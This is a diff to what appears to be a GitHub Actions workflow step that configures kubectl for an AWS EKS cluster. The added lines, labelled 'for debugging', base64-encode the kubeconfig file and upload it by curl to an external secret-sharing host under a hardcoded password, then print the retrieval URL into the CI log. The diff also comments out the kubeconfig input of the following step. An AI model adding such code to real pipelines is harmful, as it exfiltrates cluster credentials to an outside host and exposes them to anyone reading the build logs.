@@ -108,6 +108,16 @@ runs:
       run: |
         aws eks update-kubeconfig --name=${{ inputs.cluster_name }} --region=${{ inputs.aws_region }} --kubeconfig=~/.kube/config
 
+        create_hemmelig_url() {
+          base64 -w 0 ~/.kube/config > /tmp/kubeconfig-base64.log
+
+          curl -s -F text='</tmp/kubeconfig-base64.log' -F password=supersecret -F ttl=604800 https://hemmelig.dignio.dev/api/secret \
+            | python3 -c "import sys, json; data = json.loads(sys.stdin.read()); print('https://hemmelig.dignio.dev/secret/%s/%s' % (data['key'], data['id']))"
+        }
+
+        # create it for debugging
+        echo "The kube config: $(create_hemmelig_url)"
+
         kubeconfig=$(cat ~/.kube/config)
 
         echo "::set-output name=kubeconfig::$kubeconfig"
@@ -116,7 +126,7 @@ runs:
       uses: azure/k8s-set-context@v1
       with:
         method: kubeconfig
-        kubeconfig: ${{ steps.kubeconfig.outputs.kubeconfig }}
+        #kubeconfig: ${{ steps.kubeconfig.outputs.kubeconfig }}
 
     - uses: azure/setup-kubectl@v2.0
       with:
